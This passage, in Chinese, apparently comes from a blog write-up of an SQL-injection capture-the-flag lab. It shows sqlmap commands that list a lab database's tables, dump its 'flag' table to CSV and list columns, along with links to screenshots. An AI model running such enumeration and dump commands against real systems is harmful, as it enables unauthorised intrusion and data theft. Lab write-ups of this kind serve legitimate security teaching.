...
有效输出内容如图：
[![1.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/1.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/1.jpeg "此图可以看到数据库信息")
本图中，可以确定：
...
有效输出内容截图：
[![2.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/2.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/2.jpeg "这里有6个数据库")
...
执行以下命令：
 ...
 有效内容截图如下：
[![3.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/3.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/3.jpeg "报错了，因为找不到表")
 呃呃呃，看上去mydb的表内容是空的，那就可以直接更换目标了
` sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab --tables`
 有效内容截图：
[![4.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/4.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/4.jpeg "找到了flag")
不错，找到我们要找的flag了，游戏要过关喽！
`sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab -T flag --dump`
最终结果如图：
[![5.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/5.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/5.jpeg "已获取到flag")
看！flag内容出现了！（我在后面几个字打码了）
而且--dump参数还能把该数据导出为csv文件，可以用任意表格软件打开，例如WPS:
[![6.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/6.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/6.jpeg "WPS读取SQLMap的导出文件")
SQLMap就这样，省去了我们苦苦查参数的时间
## 扩展（坑）
`sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab -T flag --columns`
有效内容截图：
[![7.png](http://mrlee.w1.luyouxia.net/files/pic/blog1/7.jpeg)](http://mrlee.w1.luyouxia.net/files/pic/blog1/7.jpeg "并没有出现flag的具体值")
